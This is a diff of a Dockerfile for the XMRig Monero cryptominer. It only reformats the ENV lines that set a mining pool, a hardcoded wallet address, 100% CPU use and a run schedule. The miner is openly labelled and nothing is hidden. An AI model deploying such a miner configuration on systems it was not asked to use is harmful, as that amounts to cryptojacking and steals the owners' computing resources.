@@ -4,15 +4,15 @@ ARG XMRIG_VERSION='v6.3.2'
 
 # Configuration variables.
 ENV DEBIAN_FRONTEND=noninteractive
-ENV POOL_URL    		pool.supportxmr.com:5555
-ENV POOL_USER   		45rfqYG9iNPddvenLpjFskJUhFgqBkdhDeah3X8D8ZJM3KpKqZWCLz3ewLsVd269tZiEyQRV53Ldv2DJb6xeuFokF7SBb1p
-ENV POOL_PW     		Rancher
-ENV COIN 				monero
-ENV MAX_CPU   			100
-ENV USE_SCHEDULER		false
-ENV START_TIME			2100
-ENV STOP_TIME			0600
-ENV DAYS				Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday
+ENV POOL_URL pool.supportxmr.com:5555
+ENV POOL_USER 45rfqYG9iNPddvenLpjFskJUhFgqBkdhDeah3X8D8ZJM3KpKqZWCLz3ewLsVd269tZiEyQRV53Ldv2DJb6xeuFokF7SBb1p
+ENV POOL_PW Rancher
+ENV COIN monero
+ENV MAX_CPU 100
+ENV USE_SCHEDULER false
+ENV START_TIME 2100
+ENV STOP_TIME 0600
+ENV DAYS Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday
 
 RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 WORKDIR /root
